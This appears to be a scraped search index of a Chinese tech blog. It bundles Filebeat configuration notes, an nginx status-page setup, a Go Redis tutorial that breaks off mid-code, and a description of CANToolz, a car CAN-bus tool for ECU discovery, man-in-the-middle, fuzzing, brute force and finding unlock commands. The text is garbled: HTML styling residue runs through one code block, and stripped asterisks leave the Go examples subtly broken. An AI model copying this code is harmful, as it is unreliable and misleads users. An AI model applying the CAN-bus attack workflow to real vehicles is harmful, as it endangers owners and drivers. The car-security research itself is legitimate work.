paths：指定要监控的日志，目前按照Go语言的glob函数处理。没有对配置目录做递归处理，比如配置的如果是：\n\n    /var/log/ /.log\n\n则只会去/var/log目录的所有子目录中寻找以”.log”结尾的文件，而不会寻找/var/log目录下以”.log”结尾的文件。\n\n    encoding：指定被监控的文件的编码类型，使用plain和utf-8都是可以处理中文日志的。\n\n    inputtype：指定文件的输入类型log(默认)或者stdin。\n\n    excludelines：在输入中排除符合正则表达式列表的那些行。\n\n    includelines：包含输入中符合正则表达式列表的那些行（默认包含所有行），includelines执行完毕之后会执行excludelines。\n\n    excludefiles：忽略掉符合正则表达式列表的文件（默认为每一个符合paths定义的文件都创建一个harvester）。\n\n    fields：向输出的每一条日志添加额外的信息，比如“level:debug”，方便后续对日志进行分组统计。默认情况下，会在输出信息的fields子目录下以指定的新增fields建立子目录，例如fields.level。\n\n    fields:\n    level: debug\n\n则在Kibana看到的内容如下：\n\n这里写图片描述\n\n    fieldsunderroot：如果该选项设置为true，则新增fields成为顶级目录，而不是将其放在fields目录下。自定义的field会覆盖filebeat默认的field。例如添加如下配置：\n\n    fields:\n    level: debug\n    fieldsunderroot: true\n\n则在Kibana看到的内容如下：\n\n这里写图片描述\n\n    ignoreolder：可以指定Filebeat忽略指定时间段以外修改的日志内容，比如2h（两个小时）或者5m(5分钟)。\n\n    closeolder：如果一个文件在某个时间段内没有发生过更新，则关闭监控的文件handle。默认1h,change只会在下一次scan才会被发现\n\n    forceclosefiles：Filebeat会在没有到达closeolder之前一直保持文件的handle，如果在这个时间窗内删除文件会有问题，所以可以把forceclosefiles设置为true，只要filebeat检测到文件名字发生变化，就会关掉这个handle。\n\n    scanfrequency：Filebeat以多快的频率去prospector指定的目录下面检测文件更新（比如是否有新增文件），如果设置为0s，则Filebeat会尽可能快地感知更新（占用的CPU会变高）。默认是10s。\n\n    documenttype：设定Elasticsearch输出时的document的type字段，也可以用来给日志进行分类。\n\n    harvesterbuffersize：每个harvester监控文件时，使用的buffer的大小。\n\n    maxbytes：日志文件中增加一行算一个日志事件，maxbytes限制在一次日志事件中最多上传的字节数，多出的字节会被丢弃。\n\n    multiline：适用于日志中每一条日志占据多行的情况，比如各种语言的报错信息调用栈。这个配置的下面包含如下配置：\n\ncode class=\"hljs applescript has-numbering\" style=\"display: block; padding: 0px; color: inherit; box-sizing: border-box; font-family: \"Source Code Pro\", monospace;font-size:undefined; white-space: pre; border-radius: 0px; word-wrap: normal; background: transparent;\"pattern：多行日志开始的那一行匹配的pattern negate：是否需要对pattern条件转置使用，不翻转设为span class=\"hljs-constant\" style=\"box-sizing: border-box;\"true/span，反转设置为span class=\"hljs-constant\" style=\"box-sizing: border-box;\"false/span match：匹配pattern后，与前面（span class=\"hljs-keyword\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"before/span）还是后面（span class=\"hljs-keyword\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"after/span）的内容合并为一条日志 maxlines：合并的最多行数（包含匹配pattern的那一行） span class=\"hljs-keyword\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"timeout/span：到了span class=\"hljs-keyword\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"timeout/span之后，即使没有匹配一个新的pattern（发生一个新的事件），也把已经匹配的日志事件发送出去/codeul class=\"pre-numbering\" style=\"box-sizing: border-box; position: absolute; width: 50px; top: 0px; left: 0px; margin: 0px; padding: 6px 0px 40px; border-right-width: 1px; border-right-style: solid; border-right-color: rgb(221, 221, 221); list-style: none; text-align: right; background-color: rgb(238, 238, 238);\"li style=\"box-sizing: border-box; padding: 0px 5px;\"1/lili style=\"box-sizing: border-box; padding: 0px 5px;\"2/lili style=\"box-sizing: border-box; padding: 0px 5px;\"3/lili style=\"box-sizing: border-box; padding: 0px 5px;\"4/lili style=\"box-sizing: border-box; padding: 0px 5px;\"5/li/ul\n\n    tailfiles：如果设置为true，Filebeat从文件尾开始监控文件新增内容，把新增的每一行文件作为一个事件依次发送，而不是从文件开始处重新发送所有内容。\n\n    backoff：Filebeat检测到某个文件到了EOF之后，每次等待多久再去检测文件是否有更新，默认为1s。\n\n    maxbackoff：Filebeat检测到某个文件到了EOF之后，等待检测文件更新的最大时间，默认是10秒。\n\n    backofffactor：定义到达maxbackoff的速度，默认因子是2，到达maxbackoff后，变成每次等待maxbackoff那么长的时间才backoff一次，直到文件有更新才会重置为backoff。比如：\n\n这里写图片描述\n\n如果设置成1，意味着去使能了退避算法，每隔backoff那么长的时间退避一次。\n\n    spoolsize:spooler的大小，spooler中的事件数量超过这个阈值的时候会清空发送出去（不论是否到达超时时间）。\n\n    idletimeout:spooler的超时时间，如果到了超时时间，spooler也会清空发送出去（不论是否到达容量的阈值）。\n\n    registryfile:记录filebeat处理日志文件的位置的文件\n\n    configdir:如果要在本配置文件中引入其他位置的配置文件，可以写在这里（需要写完整路径），但是只处理prospector的部分。\n\n    publish_async：是否采用异步发送模式（实验功能）。","tags":null},{"location":"//blog.pytool.com/Hacker/2015-03-29  汽车CAN总线分析框架CANToolz","title":"汽车CAN总线分析框架CANToolz","text":"汽车CAN总线分析框架CANToolz\n CANToolz 是一个分析控制局域网络CAN(Controller Area Network) 和设备的框架。该工具基于不同的模块组装在一起，可以被安全研究人员和 汽车业/OEM 的安全测试人员使用进行黑盒分析等，你可以使用本软件发现电子控制单元ECU，中间人攻击测试，模糊测试，暴力破解，扫描或 R\u0026D测试和验证。\n\n car-hacking-4.jpg\n\n 该平台试图将所有需要的 技巧/工具 和其他你可以对CAN总线做的事情结合在一起。我发现，有许多可用的工具，从 Charlie Miller 和 Chris Valasek 工具 到Craig Smith 开发的 UDS/CAN。它们都有很出色并且有效，但它们仍然很难在每一天的工作中使用（至少对我来说），并且你需要 修改/编写 代码才能得到你想要的东西（MITM，有逻辑的扫描仪）。这就是为什么我使用这款软件。如果有更多的人可以提供模块，这会使其更有价值。它提供了一个简单的方法来添加模块并根据你的需要使用“扩展”版本（比如选择ECU自定义暴力破解等）。没有任何其他目的，这里仅仅想推荐给大家一个好的工具被更多的人使用。\n\n 还有一点：这是基于模块的引擎，所以你可以使用它作为您的测试过程的一部分，或者当你需要和CAN总线工作时，添加更复杂的 场景/软件。\n\n “我不明白为什么大家始终在发布新的“汽车黑客工具”。我和 @nudehaberdasher 在 2013 年发布的工具仍然运作的很好。” (c) Charlie Miller (‏@0xcharlie)\n\n “如何查询我们的汽车黑客 工具/数据/脚本？请下载http://illmatics.com/content.zip”(c) Chris Valasek ‏@nudehaberdasher\n\n 更多的细节和用例见[博客]（），请参见维基（目前正在开发中）：[WIKI]\n 使用硬件\n\n CANToolz 可以利用以下硬件与 CAN 网络协同工作：\n\n     USBtin\n\n     CANBus Triple\n\n 依赖项\n\n python 3.4\n   pip install pyserial\n   pip install numpy\n\n for MIDItoCAN\n   pip install mido\n\n 安装\n\n python setup.py install\n\n 快速启动\n\n sudo python cantoolz.py -g w -c examples/cansniff.py\n\n 然后在浏览器中访问 http://localhost:4444\n 模块\n\n         hwCANBusTriple – CANBus Triple HW 的 IO 模块\n\n         hwUSBtin – USBtin 的 IO 模块\n\n         modfirewall – 通过 ID 阻塞 CAN 报文模块\n\n         modfuzz1 – 简单‘代理’模糊（1字节）可以与 genping/genreplay结合使用\n\n         modprintMessage – 打印 CAN 报文\n\n         modstat – CAN 报文统计 (使用 .csv 文件 输出)分析选项（c modstat a）试图找到 UDS/ISO TP 报文\n\n         genping – 使用选择 IDs (ECU/Service discovery) 生成 CAN 报文\n\n         genreplay – 保存重发数据包\n\n 附言：我们致力于支持其他类型的I/O硬件和模块。欢迎加入我们！主要想法是希望产生不同的模块对以上8个模块提供帮助。\n\n 监看和UDS检测实例，如下图所示：\n\n vw2.png\n\n Python 2.7最终稳定版本: https://github.com/eik00d/CANToolz/tree/Python2.7last_release\n 使用示例\n\n 在示例文件夹中可以查看更多的用例：\n\n         CAN 开关过滤器扫描检测哪个 CAN 帧可以通过诊断接口到 HU 并返回\n\n         中间人与防火墙 (ECU ID 检测)，检测哪些包对应选定的“行为”\n\n         重放发现，检测哪些包对应选定的“行为”\n\n         Ping 发现( 使用 ISO TP 和 UDS 支持)， 检测 UDS 等\n\n 有许多其他可能的选择，你只要根据需要选择模块。例如 使用 DIFF 模式，找到开锁命令。\n\n 备注：目前的版本是 uber-beta。缺乏充分的测试，代码不够整洁和美观，可能还有一些尚未发现的 bug。很抱歉，有很多不需要的 IF，糟糕的代码，奇怪的 RPINTs 等，请随意修正或直接忽略。\n\n 致以最诚挚的问候：\n\n Alexey Sintsov (@asintsov)alex.sintsov@gmail.com\n\n DC#7812: DEFCON-RUSSIA","tags":null},{"location":"//blog.pytool.com/tool/2010-01-01 cash","title":"Cash","text":"---\nh1 align=\"center\"\n\timg width=\"284\" src=\"http://i.imgur.com/tKrIdAI.jpg\" alt=\"Cash\"\n\t!--","tags":null},{"location":"//blog.pytool.com/Post/python/2016-06-01 python","title":"python","text":"启动http server\npython -m SimpleHTTPServer\npython3 -m http.server","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx status","title":"Linux命令 Nginx","text":"location /status {\n  // 查看nginx当前的状态情况,需要模块 “--with-httpstubstatusmodule”支持\n               stubstatus on;\n               accesslog /usr/local/nginx/logs/status.log;\n               authbasic \"NginxStatus\"; }\n\n设定查看Nginx状态的地址\nlocation /NginxStatus {\n  stubstatus on;\n  accesslog on;\n  authbasic \"NginxStatus\";\n  authbasicuserfile conf/htpasswd;\n  htpasswd文件的内容可以用apache提供的htpasswd工具来产生。\n}\n\nNginx 的访问控制模块默认就会安装，而且写法也非常简单，可以分别有多个allow,deny，允许或禁止某个ip或ip段访问，依次满足任何一个规则就停止往下匹配。如：\n\nlocation /nginx-status {\n  stubstatus on;\n  accesslog off;\nauthbasic   \"NginxStatus\";\n  authbasicuserfile   /usr/local/nginx-1.6/htpasswd;\n  allow 192.168.10.100;\n  allow 172.29.73.0/24;\n  deny all;\n}\n\n我们也常用 httpd-devel 工具的 htpasswd 来为访问的路径设置登录密码：\n\nhtpasswd -c htpasswd admin\nNew passwd:\nRe-type new password:\nAdding password for user admin\n htpasswd htpasswd admin    //修改admin密码\nhtpasswd htpasswd sean    //多添加一个认证用户\n\n这样就生成了默认使用CRYPT加密的密码文件。打开上面nginx-status的两行注释，重启nginx生效。","tags":null},{"location":"//blog.pytool.com/Post/Elastic/beats/2016-10-04 filebeat解析json","title":"解决filebeat的@timestamp无法被json日志的同名字段覆盖的问题","text":"在filebeat.yml配置文件中加上以下两行搞定：\n\n    json.keysunderroot: true\n    json.overwritekeys: true\n\nfilebeat 解析json文件\n文档里json共有四个配置节点：\n    messagekey         指定json日志解析后放到哪个key上，默认是json，你也可以指定为log等。\n    keysunderroot     默认这个值是FALSE的，也就是我们的json日志解析后会被放在json键上。设为TRUE，所有的keys就会被放到根节点。\n    overwritekeys      是否要覆盖原有的key，这是关键配置，将keysunderroot设为TRUE后，再将overwritekeys也设为TRUE，就能把filebeat默认的key值给覆盖了。\n    adderrorkey       添加jsonerror key键记录json解析失败错误\n\n{\"@timestamp\":\"2017-03-23T09:48:49.304603+08:00\", \"outer\": \"value\", \"inner\": \"{\\\"data\\\": \\\"value\\\"}\" }\n\nThe following configuration decodes the inner JSON object:\nfilebeat.prospectors:\npaths:\n    input.json\n  json.keysunderroot: true\n  json.overwritekeys: true\nprocessors:\n  decodejsonfields:\n      fields: [\"inner\"]\n\noutput.console.pretty: true\nThe resulting output looks something like this:\n{\n  \"@timestamp\": \"2016-12-06T17:38:11.541Z\",\n  \"beat\": {\n    \"hostname\": \"host.example.com\",\n    \"name\": \"host.example.com\",\n    \"version\": \"{version}\"\n  },\n  \"inner\": {\n    \"data\": \"value\"\n  },\n  \"prospector\": {\n    \"type\": \"log\",\n  },\n  \"offset\": 55,\n  \"outer\": \"value\",\n  \"source\": \"input.json\",\n  \"type\": \"log\"\n}\n\n默认@timestamp是filebeat读取日志时的时间戳，但是我们在读取日志的时候希望根据日志生成时间来展示，以便根据日志生成时间点来定位问题。\n\n这是我生成json日志的格式：\n    {\"@timestamp\":\"2017-03-23T09:48:49.304603+08:00\",\"@source\":\"vagrant-ubuntu-trusty-64\",\"@fields\":{\"channel\":\"xhh.mq.push\",\"level\":200,\"ctxtqueue\":\"jobqueue2\",\"ctxtexchange\":\"\",\"ctxtconfirmselected\":true,\"ctxtconfirmpublished\":true,\"ctxtproperties\":{\"confirm\":true,\"transaction\":false,\"exchange\":[],\"queue\":[],\"message\":[],\"consume\":[],\"bindingkeys\":[],\"exchange2\":{\"type\":\"direct\"}}},\"@message\":\"904572:58d31d7ddc790:msgparam1~\",\"@tags\":[\"xhh.mq.push\"],\"@type\":\"xhh.mq.push\"}\n日志中包含了@timestamp，但是用filebeat收集日志后，@timestamp被filebeat自动生成的时间给覆盖了：\n    {\n            \"offset\" =  413806671,\n           \"@source\" =  \"vagrant-ubuntu-trusty-64\",\n             \"@tags\" =  [\n            [0] \"xhh.mq.push\"\n        ],\n             \"@type\" =  \"xhh.mq.push\",\n        \"inputtype\" =  \"log\",\n            \"source\" =  \"/tmp/xhhmq20170323.log\",\n              \"type\" =  \"rabbitmq\",\n           \"@fields\" =  {\n                     \"ctxtexchange\" =  \"\",\n             \"ctxtconfirmselected\" =  true,\n                             \"level\" =  200,\n                           \"channel\" =  \"xhh.mq.push\",\n                   \"ctxtproperties\" =  {\n                     \"confirm\" =  true,\n                   \"exchange2\" =  {\n                    \"type\" =  \"direct\"\n                },\n                    \"exchange\" =  nil,\n                     \"consume\" =  nil,\n                     \"message\" =  nil,\n                 \"transaction\" =  false,\n                       \"queue\" =  nil,\n                \"bindingkeys\" =  nil\n            },\n                        \"ctxtqueue\" =  \"jobqueue0\",\n            \"ctxtconfirmpublished\" =  true\n        },\n              \"tags\" =  [\n            [0] \"beatsinputrawevent\"\n        ],\n          \"@message\" =  \"995428:58d31d7ddc790:msgparam1~\",\n        \"@timestamp\" =  2017-03-24T01:00:00.930Z,\n              \"beat\" =  {\n            \"hostname\" =  \"vagrant-ubuntu-trusty-64\",\n                \"name\" =  \"vagrant-ubuntu-trusty-64\",\n             \"version\" =  \"5.2.1\"\n        },\n          \"@version\" =  \"1\",\n              \"host\" =  \"vagrant-ubuntu-trusty-64\"\n    }\n时间变成了filebeat读取日志时的时间，这完全不是我想要的，没办法网上找解决方式，发现GitHub官网也有人在问同个问题，链接地址：https://github.com/logstash-plugins/logstash-input-beats/issues/33\n\n话说好像是bug？评论里说可以用grok进行转换，即在日志里先定义一个messageTimestamp字段，然后filebeat推到logstash后再通过filter配置将其转换为logstash的timestamp，貌似这也可以，不过应该会有更简便的解决方式的才对。在万能的谷哥引导下，原来filebeat最新版已经解决了这个问题了~ So就是这里了：https://www.elastic.co/guide/en/beats/filebeat/current/configuration-filebeat-options.htmlconfig-json\n\nThese options make it possible for Filebeat to decode logs structured as JSON messages. Filebeat processes the logs line by line, so the JSON decoding only works if there is one JSON object per line.\n\nThe decoding happens before line filtering and multiline. You can combine JSON decoding with filtering and multiline if you set the messagekey option. This can be helpful in situations where the application logs are wrapped in JSON objects, like it happens for example with Docker.\n\nExample configuration:\n\njson.keysunderroot: true\njson.adderrorkey: true\njson.messagekey: log\n\nkeysunderroot\n    By default, the decoded JSON is placed under a \"json\" key in the output document. If you enable this setting, the keys are copied top level in the output document. The default is false.\noverwritekeys\n    If keysunderroot and this setting are enabled, then the values from the decoded JSON object overwrite the fields that Filebeat normally adds (type, source, offset, etc.) in case of conflicts.\nadderrorkey\n    If this setting is enabled, Filebeat adds a \"jsonerror\" key in case of JSON unmarshalling errors or when a messagekey is defined in the configuration but cannot be used.\nmessagekey\n    An optional configuration setting that specifies a JSON key on which to apply the line filtering and multiline settings. If specified the key must be at the top level in the JSON object and the value associated with the key must be a string, otherwise no filtering or multiline aggregation will occur.","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang redis","title":"Go语言 Redis","text":"Golang redis 操作初体验 （SegmentFault）\n\n安装\n\n我使用的是 https://github.com/go-redis/r... 这个 golang 客户端, 因此安装方式如下:\n\ngo get gopkg.in/redis.v4\n\n接着在代码中导入此包即可:\n\nimport \"gopkg.in/redis.v4\"\n\n基本操作\n创建客户端\n\n通过 redis.NewClient 函数即可创建一个 redis 客户端, 这个方法接收一个 redis.Options 对象参数, 通过这个参数, 我们可以配置 redis 相关的属性, 例如 redis 服务器地址, 数据库名, 数据库密码等.下面是一个连接的例子:\n// 创建 redis 客户端\nfunc createClient() redis.Client {\n    client := redis.NewClient(\u0026redis.Options{\n        Addr:     \"localhost:6379\",\n        Password: \"\",\n        DB:       0,\n    })\n\n    // 通过 cient.Ping() 来检查是否成功连接到了 redis 服务器\n    pong, err := client.Ping().Result()\n    fmt.Println(pong, err)\n\n    return client\n}\n String 操作\nKEYS  \t查找与指定模式匹配的所有键\n\nredis 的 String 操作有:\n\nset(key, value)：给数据库中名称为key的string赋予值value\nget(key)：返回数据库中名称为key的string的value\ngetset(key, value)：给名称为key的string赋予上一次的value\nmget(key1, key2,…, key N)：返回库中多个string的value\nsetnx(key, value)：添加string，名称为key，值为value\nsetex(key, time, value)：向库中添加string，设定过期时间time\nmset(key N, value N)：批量设置多个string的值\nmsetnx(key N, value N)：如果所有名称为key i的string都不存在\nincr(key)：名称为key的string增1操作\nincrby(key, integer)：名称为key的string增加integer\ndecr(key)：名称为key的string减1操作\ndecrby(key, integer)：名称为key的string减少integer\nappend(key, value)：名称为key的string的值附加value\nsubstr(key, start, end)：返回名称为key的string的value的子串\n\n在 go-redis 中, 我们可以直接找到对应的操作方法, 直接上代码:\n// String 操作\nfunc stringOperation(client redis.Client) {\n    // 第三个参数是过期时间, 如果是0, 则表示没有过期时间.\n    err := client.Set(\"name\", \"xys\", 0).Err()\n    if err != nil {\n        panic(err)\n    }\n\n    val, err := client.Get(\"name\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"name\", val)\n\n    // 这里设置过期时间.\n    err = client.Set(\"age\", \"20\", 1  time.Second).Err()\n    if err != nil {\n        panic(err)\n    }\n\n    client.Incr(\"age\") // 自增\n    client.Incr(\"age\") // 自增\n    client.Decr(\"age\") // 自减\n\n    val, err = client.Get(\"age\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"age\", val) // age 的值为21\n\n    // 因为 key \"age\" 的过期时间是一秒钟, 因此当一秒后, 此 key 会自动被删除了.\n    time.Sleep(1  time.Second)\n    val, err = client.Get(\"age\").Result()\n    if err != nil {\n        // 因为 key \"age\" 已经过期了, 因此会有一个 redis: nil 的错误.\n        fmt.Printf(\"error: %v\\n\", err)\n    }\n    fmt.Println(\"age\", val)\n}\nlist 操作\n\nredis 的 list 操作有:\n\nrpush(key, value)：在名称为key的list尾添加一个值为value的元素\nlpush(key, value)：在名称为key的list头添加一个值为value的 元素\nllen(key)：返回名称为key的list的长度\nlrange(key, start, end)：返回名称为key的list中start至end之间的元素\nltrim(key, start, end)：截取名称为key的list\nlindex(key, index)：返回名称为key的list中index位置的元素\nlset(key, index, value)：给名称为key的list中index位置的元素赋值\nlrem(key, count, value)：删除count个key的list中值为value的元素\nlpop(key)：返回并删除名称为key的list中的首元素\nrpop(key)：返回并删除名称为key的list中的尾元素\nblpop(key1, key2,… key N, timeout)：lpop命令的block版本。\nbrpop(key1, key2,… key N, timeout)：rpop的block版本。\nrpoplpush(srckey, dstkey)：返回并删除名称为srckey的list的尾元素，并将该元素添加到名称为dstkey的list的头部\n\n同样地, 在 go-redis 中也可以找到对应的方法, 下面是一个简单的示例:\n// list 操作\nfunc listOperation(client redis.Client) {\n    client.RPush(\"fruit\", \"apple\") //在名称为 fruit 的list尾添加一个值为value的元素\n    client.LPush(\"fruit\", \"banana\") //在名称为 fruit 的list头添加一个值为value的 元素\n    length, err := client.LLen(\"fruit\").Result() //返回名称为 fruit 的list的长度\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"length: \", length) // 长度为2\n\n    value, err := client.LPop(\"fruit\").Result() //返回并删除名称为 fruit 的list中的首元素\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"fruit: \", value)\n\n    value, err = client.RPop(\"fruit\").Result() // 返回并删除名称为 fruit 的list中的尾元素\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"fruit: \", value)\n}\n set 操作\n\nredis 的 set 操作:\nsadd(key, member)：向名称为key的set中添加元素member\nsrem(key, member) ：删除名称为key的set中的元素member\nspop(key) ：随机返回并删除名称为key的set中一个元素\nsmove(srckey, dstkey, member) ：移到集合元素\nscard(key) ：返回名称为key的set的基数\nsismember(key, member) ：member是否是名称为key的set的元素\nsinter(key1, key2,…key N) ：求交集\nsinterstore(dstkey, (keys)) ：求交集并将交集保存到dstkey的集合\nsunion(key1, (keys)) ：求并集\nsunionstore(dstkey, (keys)) ：求并集并将并集保存到dstkey的集合\nsdiff(key1, (keys)) ：求差集\nsdiffstore(dstkey, (keys)) ：求差集并将差集保存到dstkey的集合\nsmembers(key) ：返回名称为key的set的所有元素\nsrandmember(key) ：随机返回名称为key的set的一个元素\n接下来是 go-redis 的 set 操作:\n// set 操作\nfunc setOperation(client redis.Client) {\n    client.SAdd(\"blacklist\", \"Obama\") // 向 blacklist 中添加元素\n    client.SAdd(\"blacklist\", \"Hillary\") // 再次添加\n    client.SAdd(\"blacklist\", \"the Elder\") // 添加新元素\n\n    client.SAdd(\"whitelist\", \"the Elder\") // 向 whitelist 添加元素\n\n    // 判断元素是否在集合中\n    isMember, err := client.SIsMember(\"blacklist\", \"Bush\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"Is Bush in blacklist: \", isMember)\n\n    // 求交集, 即既在黑名单中, 又在白名单中的元素\n    names, err := client.SInter(\"blacklist\", \"whitelist\").Result()\n    if err != nil {\n        panic(err)\n    }\n    // 获取到的元素是 \"the Elder\"\n    fmt.Println(\"Inter result: \", names)\n\n    // 获取指定集合的所有元素\n    all, err := client.SMembers(\"blacklist\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"All member: \", all)\n}\nhash 操作\n\nredis 的 hash 操作:\n\nhset(key, field, value)：向名称为key的hash中添加元素field\nhget(key, field)：返回名称为key的hash中field对应的value\nhmget(key, (fields))：返回名称为key的hash中field i对应的value\nhmset(key, (fields))：向名称为key的hash中添加元素field\nhincrby(key, field, integer)：将名称为key的hash中field的value增加integer\nhexists(key, field)：名称为key的hash中是否存在键为field的域\nhdel(key, field)：删除名称为key的hash中键为field的域\nhlen(key)：返回名称为key的hash中元素个数\nhkeys(key)：返回名称为key的hash中所有键(字段)\nhvals(key)：返回名称为key的hash中所有键对应的value\nhgetall(key)：返回名称为key的hash中所有的键（field）及其对应的value\n\ngo-redis 中的 hash 操作:\n// hash 操作\nfunc hashOperation(client redis.Client) {\n    client.HSet(\"userxys\", \"name\", \"xys\"); // 向名称为 userxys 的 hash 中添加元素 name\n    client.HSet(\"userxys\", \"age\", \"18\"); // 向名称为 userxys 的 hash 中添加元素 age\n\n    // 批量地向名称为 usertest 的 hash 中添加元素 name 和 age\n    client.HMSet(\"usertest\", map[string]string{\"name\": \"test\", \"age\":\"20\"})\n    // 批量获取名为 usertest 的 hash 中的指定字段的值.\n    fields, err := client.HMGet(\"usertest\", \"name\", \"age\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"fields in usertest: \", fields)\n\n    // 获取名为 userxys 的 hash 中的字段个数\n    length, err := client.HLen(\"userxys\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"field count in userxys: \", length) // 字段个数为2\n\n    // 删除名为 usertest 的 age 字段\n    client.HDel(\"usertest\", \"age\")\n    age, err := client.HGet(\"usertest\", \"age\").Result()\n    if err != nil {\n        fmt.Printf(\"Get usertest age error: %v\\n\", err)\n    } else {\n        fmt.Println(\"usertest age is: \", age) // 字段个数为2\n    }\n}\n 关于连接池\n\nredis.v4 包实现了 redis 的连接池管理, 因此我们就不需要自己手动管理 redis 的连接了.默认情况下, redis.v4 的 redis 连接池大小是10, 不过我们可以在初始化 redis 客户端时自行设置连接池的大小, 例如:\n\nclient := redis.NewClient(\u0026redis.Options{\n    Addr:     \"localhost:6379\",\n    Password: \"\",\n    DB:       0,\n    PoolSize: 5,\n})\n\n通过 redis.Options 的 PoolSize 属性, 我们设置了 redis 连接池的大小为5.那么接下来我们来看一下这个设置有什么效果吧:\n// redis.v4 的连接池管理\nfunc connectPool(client redis.Client) {\n    wg := sync.WaitGroup{}\n    wg.Add(10)\n\n    for i := 0; i \u003c 10; i++ {\n        go func() {\n            defer wg.Done()\n\n            for j := 0; j \u003c 100; j++ {\n                client.Set(fmt.Sprintf(\"name%d\", j), fmt.Sprintf(\"xys%d\", j), 0).Err()\n                client.Get(fmt.Sprintf(\"name%d\", j)).Result()\n            }\n\n            fmt.Printf(\"PoolStats, TotalConns: %d, FreeConns: %d\\n\", client.PoolStats().TotalConns, client.PoolStats().FreeConns);\n        }()\n    }\n\n    wg.Wait()\n}\n上面的例子启动了10个 routine 来不断向 redis 读写数据, 然后我们通过 client.PoolStats() 获取连接池的信息. 运行这个例子, 输出如下:\n\nPoolStats, TotalConns: 5, FreeConns: 1\nPoolStats, TotalConns: 5, FreeConns: 1\nPoolStats, TotalConns: 5, FreeConns: 1\nPoolStats, TotalConns: 5, FreeConns: 1\nPoolStats, TotalConns: 5, FreeConns: 1\nPoolStats, TotalConns: 5, FreeConns: 2\nPoolStats, TotalConns: 5, FreeConns: 2\nPoolStats, TotalConns: 5, FreeConns: 3\nPoolStats, TotalConns: 5, FreeConns: 4\nPoolStats, TotalConns: 5, FreeConns: 5\n\n通过输出可以看到, 此时最大的连接池数量确实是 5 了, 并且一开始时, 因为 coroutine 的数量大于5, 会造成 redis 连接不足的情况(反映在 FreeConns 上就是前几次的输出 FreeConns 一直是1), 当某个 coroutine 结束后, 会释放此 redis 连接, 因此 FreeConns 会增加.\n完整示例\n//\n// author xiongyongshun\n// project goredis\n// version 1.0\n// created 16/10/6 03:49\n//\npackage main\n\nimport (\n    \"fmt\"\n    \"gopkg.in/redis.v4\"\n    \"time\"\n    \"sync\"\n)\n\nfunc main() {\n    client := createClient()\n    defer client.Close()\n\n    stringOperation(client)\n    listOperation(client)\n    setOperation(client)\n    hashOperation(client)\n\n    connectPool(client)\n\n}\n\n// 创建 redis 客户端\nfunc createClient() redis.Client {\n    client := redis.NewClient(\u0026redis.Options{\n        Addr:     \"localhost:6379\",\n        Password: \"\",\n        DB:       0,\n        PoolSize: 5,\n    })\n\n    pong, err := client.Ping().Result()\n    fmt.Println(pong, err)\n\n    return client\n}\n\n// String 操作\nfunc stringOperation(client redis.Client) {\n    // 第三个参数是过期时间, 如果是0, 则表示没有过期时间.\n    err := client.Set(\"name\", \"xys\", 0).Err()\n    if err != nil {\n        panic(err)\n    }\n\n    val, err := client.Get(\"name\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"name\", val)\n\n    // 这里设置过期时间.\n    err = client.Set(\"age\", \"20\", 1  time.Second).Err()\n    if err != nil {\n        panic(err)\n    }\n\n    client.Incr(\"age\") // 自增\n    client.Incr(\"age\") // 自增\n    client.Decr(\"age\") // 自减\n\n    val, err = client.Get(\"age\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"age\", val) // age 的值为21\n\n    // 因为 key \"age\" 的过期时间是一秒钟, 因此当一秒后, 此 key 会自动被删除了.\n    time.Sleep(1  time.Second)\n    val, err = client.Get(\"age\").Result()\n    if err != nil {\n        // 因为 key \"age\" 已经过期了, 因此会有一个 redis: nil 的错误.\n        fmt.Printf(\"error: %v\\n\", err)\n    }\n    fmt.Println(\"age\", val)\n}\n\n// list 操作\nfunc listOperation(client redis.Client) {\n    client.RPush(\"fruit\", \"apple\") //在名称为 fruit 的list尾添加一个值为value的元素\n    client.LPush(\"fruit\", \"banana\") //在名称为 fruit 的list头添加一个值为value的 元素\n    length, err := client.LLen(\"fruit\").Result() //返回名称为 fruit 的list的长度\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"length: \", length) // 长度为2\n\n    value, err := client.LPop(\"fruit\").Result() //返回并删除名称为 fruit 的list中的首元素\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"fruit: \", value)\n\n    value, err = client.RPop(\"fruit\").Result() // 返回并删除名称为 fruit 的list中的尾元素\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"fruit: \", value)\n}\n\n// set 操作\nfunc setOperation(client redis.Client) {\n    client.SAdd(\"blacklist\", \"Obama\") // 向 blacklist 中添加元素\n    client.SAdd(\"blacklist\", \"Hillary\") // 再次添加\n    client.SAdd(\"blacklist\", \"the Elder\") // 添加新元素\n\n    client.SAdd(\"whitelist\", \"the Elder\") // 向 whitelist 添加元素\n\n    // 判断元素是否在集合中\n    isMember, err := client.SIsMember(\"blacklist\", \"Bush\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"Is Bush in blacklist: \", isMember)\n\n    // 求交集, 即既在黑名单中, 又在白名单中的元素\n    names, err := client.SInter(\"blacklist\", \"whitelist\").Result()\n    if err != nil {\n        panic(err)\n    }\n    // 获取到的元素是 \"the Elder\"\n    fmt.Println(\"Inter result: \", names)\n\n    // 获取指定集合的所有元素\n    all, err := client.SMembers(\"blacklist\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"All member: \", all)\n}\n\n// hash 操作\nfunc hashOperation(client redis.Client) {\n    client.HSet(\"userxys\", \"name\", \"xys\"); // 向名称为 userxys 的 hash 中添加元素 name\n    client.HSet(\"userxys\", \"age\", \"18\"); // 向名称为 userxys 的 hash 中添加元素 age\n\n    // 